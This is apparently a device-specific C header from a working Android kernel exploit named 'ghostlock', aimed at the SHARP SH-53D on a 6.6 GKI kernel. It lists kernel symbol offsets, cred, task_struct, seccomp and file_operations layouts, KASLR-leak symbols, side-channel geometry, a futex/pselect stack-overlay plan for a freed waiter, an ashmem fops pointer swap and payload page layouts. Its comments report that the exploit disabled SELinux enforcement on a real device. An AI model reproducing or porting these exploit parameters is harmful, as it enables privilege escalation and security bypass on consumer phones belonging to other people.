#ifndef TARGET_H
#define TARGET_H

/* SHARP AQUOS wish3 SH-53D 38JP_3_330
 * Android 15, MT6833, exact stock GKI 6.6.89 build 13762941.
 * Global symbols and structure layouts come from the official Google CI
 * vmlinux whose extracted Image is byte-identical to the stock boot Image.
 */
#define BUILD_VARIANT_LABEL "ghostlock_sh53d_38JP_3_330"
#define BUILD_FINGERPRINT "DOCOMO/SH-53D/SH-53D:15/AP3A.240905.015.A2/38JP_3_330:user/release-keys"
/* Struct-layout identity of this header; must match the .layout of whichever
 * offsets.h entry the running kernel selects. See src/devices/offsets.h. */
#define TARGET_LAYOUT_ID "sh53d-6.6"

/* ---------------------------------------------------------------- memory ---
 * VA_BITS=39 — confirmed by _text = 0xffffffc080000000 in the image kallsyms.
 */
#define KIMAGE_TEXT_BASE 0xffffffc080000000ULL
#define P0_PAGE_OFFSET 0xffffff8000000000ULL

/* DRAM base, from the /memory node of the MT6833 DTB in vendor_boot. */
#define P0_PHYS_OFFSET 0x40000000ULL

/* Physical Image load address. The same MT6833 unit established
 * 0x40080000 on the Android 13 build through a working linear-map primitive.
 * The 38JP_3_330 port revalidated it directly: W1 through this alias changed
 * the exact stock selinux_state enforcing byte from 1 to 0 on the first
 * physical-device run. An incorrect load address does not reach that symbol.
 */
#ifndef P0_KERNEL_PHYS_LOAD
#define P0_KERNEL_PHYS_LOAD 0x40080000ULL
#endif

/* Conservative bounds, not measured spans. The linear map for VA_BITS=39 runs
 * to 0xffffffc000000000; MT6833 DRAM is contiguous from P0_PHYS_OFFSET, so any
 * shipping RAM size falls well inside these. Widening only costs scan time.
 */
#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
#define KERNELSNITCH_IDENTITY_END 0xffffff8200000000ULL
#define DIRECT_MAP_BASE 0xffffff8000000000ULL
#define DIRECT_MAP_END 0xffffff8200000000ULL
#define VMEMMAP_START 0xfffffffe00000000ULL

/* ------------------------------------------- KernelSnitch geometry ---------
 * These describe kernel-side allocator and hash-table shapes, so they belong
 * to a kernel build the same way the struct offsets do. They used to live in
 * common.h, where a 6.12 value silently applied to every device.
 *
 * MM_STRUCT_SZ is the mm_cachep object size, not sizeof(struct mm_struct).
 * mm_cache_init() asks for
 *     sizeof(struct mm_struct) + cpumask_size() + mm_cid_size()
 * with SLAB_HWCACHE_ALIGN. Here: BTF says sizeof = 1216 (0x4c0), the embedded
 * .config has CONFIG_NR_CPUS=32 and no CONFIG_CPUMASK_OFFSTACK so
 * cpumask_size() = 8, and rounding up to the 64-byte cache line gives 1280.
 * The scan enumerates candidates as slab_base + k*MM_STRUCT_SZ, so a wrong
 * value here means it steps straight past the real object.
 */
#define MM_STRUCT_SZ 0x500
#define MM_ORDER 3

/* futex_init(): roundup_pow_of_two(256 * num_possible_cpus()). The device
 * reports CPUs 0-7 and the first run confirmed futex_hashsize 2048. */
#define FUTEX_HASHSIZE 2048

/* Kernel heap pointers carry a tag in bits [59:56] when KASAN_HW_TAGS is
 * active, and the futex key hashes the whole mm pointer -- so an untagged
 * scan can never match. This kernel has CONFIG_KASAN_HW_TAGS=y and
 * CONFIG_ARM64_MTE=y compiled in, but on a production build it stays off
 * unless the bootloader passes kasan=on, so the default is untagged.
 * GHOSTLOCK_MTE=1 turns the tag search on without a rebuild.
 * The first physical-device run found every mm_struct with the untagged sweep. */
#define KS_MTE_TAGGED 0

/* On the first MT6833 run the baseline was 4, threshold 40 and accepted
 * collisions were 14002..35465, leaving a wide measured margin. */
#define KERNELSNITCH_THRESHOLD_MULT 10

/* ------------------------------------------- global symbols (kallsyms) --- */
#define INIT_TASK_OFF 0x020de280ULL
#define INIT_CRED_OFF 0x020f0548ULL
#define INIT_UTS_NS_OFF 0x02261f90ULL
#define EMPTY_ZERO_PAGE_OFF 0x022cd000ULL
#define ROOT_TASK_GROUP_OFF 0x022d5580ULL
#define SELINUX_ENFORCING_OFF 0x02316ea0ULL
#define KPTR_RESTRICT_OFF 0x020dbd20ULL
/* no security_hook_active_capable_* symbol on this 6.6 build */
#define CAP_CAPABLE_ACTIVE_OFF 0ULL
#define KPTR_RESTRICT          (KIMAGE_TEXT_BASE + KPTR_RESTRICT_OFF)
#define SELINUX_BLOB_SIZES_OFF 0x01650e88ULL
#define SECURITY_HOOK_HEADS_OFF 0x01650750ULL
#define KMALLOC_CACHES_OFF 0x01650290ULL
#define ANON_PIPE_BUF_OPS_OFF 0x0114b2c8ULL
#define CONFIGFS_READ_ITER_OFF 0x0048ab70ULL
#define CONFIGFS_BIN_WRITE_ITER_OFF 0x0048b09cULL
#define COPY_SPLICE_READ_OFF 0x0040f4b8ULL
#define NOOP_LLSEEK_OFF 0x003c2258ULL
/* C ashmem (drivers/staging/android/ashmem.c), not the Rust driver.
 * ASHMEM_MISC_FOPS is the fops *pointer slot* the exploit swaps, i.e.
 * &ashmem_misc.fops == ashmem_misc + offsetof(struct miscdevice, fops).
 */
#define ASHMEM_MISC_FOPS_OFF 0x0223b3a8ULL
#define ASHMEM_FOPS_OFF 0x012cb6d8ULL
#define ASHMEM_IOCTL_OFF 0x00c7d78cULL
#define ASHMEM_COMPAT_IOCTL_OFF 0x00c7de48ULL
#define ASHMEM_MMAP_OFF 0x00c7de9cULL
#define ASHMEM_OPEN_OFF 0x00c7e0bcULL
#define ASHMEM_RELEASE_OFF 0x00c7e144ULL
#define ASHMEM_SHOW_FDINFO_OFF 0x00c7e1d0ULL

/* KASLR leak */
#define SLIDE_NFULNL_LOGGER_OFF 0x020d2258ULL
#define SLIDE_LOGGERS_0_1_OFF 0x020d21b0ULL
#define SLIDE_RANDOM_BOOT_ID_DATA_OFF 0x02337e98ULL
#define SLIDE_SYSCTL_BOOTID_OFF 0x02337e98ULL

/* Derived macros */
#define INIT_TASK           (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
#define INIT_CRED           (KIMAGE_TEXT_BASE + INIT_CRED_OFF)
#define INIT_UTS_NS         (KIMAGE_TEXT_BASE + INIT_UTS_NS_OFF)
#define EMPTY_ZERO_PAGE     (KIMAGE_TEXT_BASE + EMPTY_ZERO_PAGE_OFF)
#define ROOT_TASK_GROUP     (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
#define SELINUX_ENFORCING   (KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF)
#define SELINUX_BLOB_SIZES  (KIMAGE_TEXT_BASE + SELINUX_BLOB_SIZES_OFF)
#define SECURITY_HOOK_HEADS (KIMAGE_TEXT_BASE + SECURITY_HOOK_HEADS_OFF)
#define KMALLOC_CACHES      (KIMAGE_TEXT_BASE + KMALLOC_CACHES_OFF)
#define ANON_PIPE_BUF_OPS   (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)
#define ASHMEM_MISC_FOPS    (KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF)
#define ASHMEM_FOPS         (KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF)
#define ASHMEM_IOCTL        (KIMAGE_TEXT_BASE + ASHMEM_IOCTL_OFF)
#define ASHMEM_COMPAT_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_COMPAT_IOCTL_OFF)
#define ASHMEM_MMAP         (KIMAGE_TEXT_BASE + ASHMEM_MMAP_OFF)
#define ASHMEM_OPEN         (KIMAGE_TEXT_BASE + ASHMEM_OPEN_OFF)
#define ASHMEM_RELEASE      (KIMAGE_TEXT_BASE + ASHMEM_RELEASE_OFF)
#define ASHMEM_SHOW_FDINFO  (KIMAGE_TEXT_BASE + ASHMEM_SHOW_FDINFO_OFF)
#define CONFIGFS_READ_ITER      (KIMAGE_TEXT_BASE + CONFIGFS_READ_ITER_OFF)
#define CONFIGFS_BIN_WRITE_ITER (KIMAGE_TEXT_BASE + CONFIGFS_BIN_WRITE_ITER_OFF)
#define COPY_SPLICE_READ    (KIMAGE_TEXT_BASE + COPY_SPLICE_READ_OFF)
#define NOOP_LLSEEK         (KIMAGE_TEXT_BASE + NOOP_LLSEEK_OFF)
#define SLIDE_NFULNL_LOGGER_IMAGE       (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OFF)
#define SLIDE_LOGGERS_0_1_IMAGE         (KIMAGE_TEXT_BASE + SLIDE_LOGGERS_0_1_OFF)
#define SLIDE_RANDOM_BOOT_ID_DATA_IMAGE (KIMAGE_TEXT_BASE + SLIDE_RANDOM_BOOT_ID_DATA_OFF)
#define SLIDE_INIT_TASK_IMAGE           (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
#define SLIDE_ROOT_TASK_GROUP_IMAGE     (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
#define SLIDE_SYSCTL_BOOTID_IMAGE       (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)

/* ---------------------------------------------------- pselect overlay ------
 * Exact stock Image disassembly gives the following stack-frame geometry.
 *
 *   core_sys_select        entry SP 0xffffffc08000bd70  frame 0x1f0,
 *                          stack_fds at sp+0x80
 *   futex_wait_requeue_pi  entry SP 0xffffffc08000bd30  frame 0x1c0,
 *                          rt_waiter at sp+0x90
 *   call-chain arithmetic places both objects at syscall-entry SP-0x200
 *   rt_waiter == stack_fds == 0xffffffc08000bc00  ->  waiter word 0
 *
 * The freed waiter lands exactly on stack_fds[0]; lock ends up at word 11,
 * inside the user-controlled 0..14 range, so the overlay is feasible.
 *
 * The -64 also falls out statically from the call-chain frames, which is how
 * a port can be scoped before booting anything:
 *   (__arm64_sys_pselect6 0x90) - (__arm64_sys_futex 0x70 + do_futex 0x60)
 * Both routes call libc select(), which on arm64 is the pselect6 syscall
 * (arm64 has no __NR_select), so pselect6 is the right chain for both.
 *
 * fops.c's words[] is written for a waiter at word 2  -> shift = 0 - 2 = -2
 * slide.c's words[] indexes the waiter from word 0    -> shift = 0
 */
#define PSELECT_WAITER_WORD_SHIFT -2
#define SLIDE_PSELECT_WORD_SHIFT 0
#define SLIDE_PSELECT_NFDS 320
#define SLIDE_USE_SELECT 1

/* ------------------------------------------- struct fields (BTF verified) --
 * Read from the kernel's own BTF. These are 6.6 layouts and differ from the
 * 6.12 layouts in src/core/target.h — notably file_operations, which gained
 * fop_flags after `owner` in 6.12 and shifted llseek..mmap by 8.
 */
#define WAITER_LOCAL_OFF          0x80
#define WAITER_TREE_ENTRY_OFF     0x00
#define WAITER_PI_TREE_ENTRY_OFF  0x28
#define WAITER_TASK_OFF           0x50
#define WAITER_LOCK_OFF           0x58
#define WAITER_WAKE_STATE_OFF     0x60
#define WAITER_PRIO_OFF           0x18
#define WAITER_DEADLINE_OFF       0x20
#define WAITER_WW_CTX_OFF         0x68

#define FAKE_WAITER_TREE_PRIO_OFF         0x18
#define FAKE_WAITER_TREE_DEADLINE_OFF     0x20
#define FAKE_WAITER_PI_TREE_ENTRY_OFF     0x28
#define FAKE_WAITER_PI_TREE_PRIO_OFF      0x40
#define FAKE_WAITER_PI_TREE_DEADLINE_OFF  0x48
#define FAKE_WAITER_TASK_OFF              0x50
#define FAKE_WAITER_LOCK_OFF              0x58
#define FAKE_WAITER_WAKE_STATE_OFF        0x60
#define FAKE_WAITER_WW_CTX_OFF            0x68

/* task_struct — sizeof = 0x12c0 */
#define FAKE_TASK_USAGE_OFF          0x40
#define FAKE_TASK_PRIO_OFF           0x84
#define FAKE_TASK_NORMAL_PRIO_OFF    0x8c
#define FAKE_TASK_TASK_GROUP_OFF     0x348
#define FAKE_TASK_PI_LOCK_OFF        0x90c
#define FAKE_TASK_PI_WAITERS_OFF     0x920
#define FAKE_TASK_PI_TOP_TASK_OFF    0x930
#define FAKE_TASK_PI_BLOCKED_ON_OFF  0x938

/* mm_struct.owner sits in an anonymous struct; value comes from the BTF
 * brute-force path in tools/extract_btf.py and is not used by the exploit. */
#define MM_OWNER_OFF 0x408
#define TASK_PID_OFF             0x618
#define TASK_TGID_OFF            0x61c
#define TASK_REAL_PARENT_OFF     0x628
#define TASK_ATOMIC_FLAGS_OFF    0x5d8
#define TASK_REAL_CRED_OFF       0x818
#define TASK_CRED_OFF            0x820
#define TASK_COMM_OFF            0x830
#define TASK_TASKS_OFF           0x550
#define TASK_THREAD_INFO_FLAGS_OFF 0x00
#define TASK_SECCOMP_OFF         0x8e8

#define CRED_UID_OFF         8
#define CRED_SECUREBITS_OFF  40
#define CRED_CAPS_OFF        48
#define CRED_SECURITY_OFF    128
#define SELINUX_CRED_BLOB_OFF  0
#define SELINUX_CRED_OSID_OFF  0
#define SELINUX_CRED_SID_OFF   4
#define SECCOMP_MODE_OFF          0x00
#define SECCOMP_FILTER_COUNT_OFF  0x04
#define SECCOMP_FILTER_OFF        0x08
#define TIF_SECCOMP_BIT           11
#define PFA_NO_NEW_PRIVS_BIT      0

/* struct page: flags at 0, the big union at 0x08 (compound_head is its first
 * tail-page member), the 4-byte _mapcount/page_type union at 0x30 — pinned by
 * BTF reporting _refcount at 0x34 and sizeof(page) = 0x40. */
#define STRUCT_PAGE_SIZE              0x40
#define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x08
#define STRUCT_SLAB_CACHE_OFF         0x08
#define STRUCT_PAGE_TYPE_OFF          0x30

/* pipe_inode_info — sizeof = 0xb8 */
#define PIPE_BUFFER_SIZE         0x28
#define PIPE_BUFFER_SLOTS        32
#define PIPE_BUF_FLAG_CAN_MERGE  0x10
#define PIPE_INODE_INFO_STRUCT_SIZE   0xb8
#define PIPE_INODE_INFO_SIZE          0xc0
#define PIPE_INODE_INFO_SLOTS_PER_PAGE 21
#define PIPE_HEAD_OFF                 0x60
#define PIPE_TAIL_OFF                 0x64
#define PIPE_MAX_USAGE_OFF            0x68
#define PIPE_RING_SIZE_OFF            0x6c
#define PIPE_NR_ACCOUNTED_OFF         0x70
#define PIPE_READERS_OFF              0x74
#define PIPE_WRITERS_OFF              0x78
#define PIPE_FILES_OFF                0x7c
#define PIPE_TMP_PAGE_OFF             0x90
#define PIPE_BUFS_OFF                 0xa8
#define PIPE_USER_OFF                 0xb0

/* file_operations — sizeof = 0x108 (6.6: no fop_flags) */
#define FOPS_OWNER_OFF        0x00
#define FOPS_LLSEEK_OFF       0x08
#define FOPS_READ_OFF         0x10
#define FOPS_WRITE_OFF        0x18
#define FOPS_READ_ITER_OFF    0x20
#define FOPS_WRITE_ITER_OFF   0x28
#define FOPS_IOCTL_OFF        0x48
#define FOPS_COMPAT_IOCTL_OFF 0x50
#define FOPS_MMAP_OFF         0x58
#define FOPS_OPEN_OFF         0x68
#define FOPS_RELEASE_OFF      0x78
#define FOPS_SPLICE_READ_OFF  0xb8
#define FOPS_SHOW_FDINFO_OFF  0xd8

/* Exploit-internal payload page layout (not kernel dependent) */
#define LOCK_OFF      0x0E80
#define W0_OFF        0x1180
#define FOPS_OFF      0x0F80
#define SCRATCH_OFF   0x1200
#define RIGHT_OFF     0x1240
#define LEFT_OFF      0x1260
#define FAKE_TASK_OFF 0x1280
#define CFG_PAGE_OFF            16
#define CFG_NEEDS_READ_FILL_OFF 80
#define CFG_BIN_BUFFER_OFF      88
#define CFG_BIN_BUFFER_SIZE_OFF 96
#define CFG_CB_MAX_SIZE_OFF     100

/* Write 2 specific */
#define CRED_COPY_OFF 0x1080

#endif
